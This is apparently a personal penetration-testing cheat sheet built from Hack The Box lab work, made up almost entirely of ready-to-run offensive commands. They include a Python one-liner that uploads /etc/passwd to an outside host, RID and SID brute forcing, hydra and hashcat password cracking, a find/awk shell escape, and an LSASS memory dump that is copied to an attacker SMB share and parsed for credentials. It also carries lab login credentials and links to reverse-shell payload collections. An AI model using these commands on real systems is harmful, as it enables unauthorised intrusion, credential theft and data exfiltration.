# Cheet Sheet

## Crawling
### python
python3 ReconSpider.py http://inlanefreight.com

## Upload
### python 1-liner
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

## Fuzzing

### fuff
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://94.237.48.60:57525/ -H "Host: FUZZ.inlanefreight.htb" -fs 116


### Gobuster
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

## Payload
cheetsheet1:[https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/]
cheetsheet2:[https://github.com/swisskyrepo/PayloadsAllTheThings]
cheetsheet3:[https://gtfobins.github.io]

## Privilege Escalation
LinPEAS

## Upgrade Shell
python -c 'import pty; pty.spawn("/bin/bash")'

## Nmap

### Convert results of nmap into html
nmap -sC -sV 10.10.10.10 -oX taregt.xml
xsltproc target.xml -o target.html

## SMB
smbclient -N -L //<FQDN/IP>
smbclient //<FQDN/IP>/<share>

## RPClient
rpcclient -U "" <FQDN/IP>
srvinfo
### Brute Forcing User RIDs
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

## NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock

## DNS
### Bruteforce to search subdomain
dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>

## SMTP
### Existing User 
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target_ip>
set USER_FILE /path/to/userlist.txt
run

## IMAP/POP3
### nmap specific port
nmap -sV -sC 10.129.160.110 -p110,143,993,995

### Search the mailbox on the imapserver 
a004 FETCH 1:* (BODY.PEEK[HEADER.FIELDS (FROM SUBJECT)])
### If you find the above command read the full mail including custom header
a004 FETCH 1 (RFC822)

## MS-SQL
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.149.195
### Connect with pyhon
impacket-mssqlclient backdoor:Password1@10.129.149.195 -windows-auth

## Oracle-TNS
sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute

### Windows RDP
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!

## Find shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

## Password Craking

### BitLocker
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt

### WinRM
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

### ssh
hydra -L user.list -P password.list ssh://10.129.42.197

### RDP
netexec winrm <ip> -u user.list -p password.list

### Default Credentials
https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv

## Attacking LSASS
### Creatting dump file on powershell
PS C:\Windows\system32> Get-Process lsass # To check PID
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full 
### Download from target
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/ # Attacking machine
PS C:\Windows\system32> move C:\lsass.dmp \\10.10.14.184\CompData # Target machine
### Extract Credential
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
### Cracking the NT Hash
sudo hashcat -m 1000 <NT Hash> /usr/share/wordlists/rockyou.txt


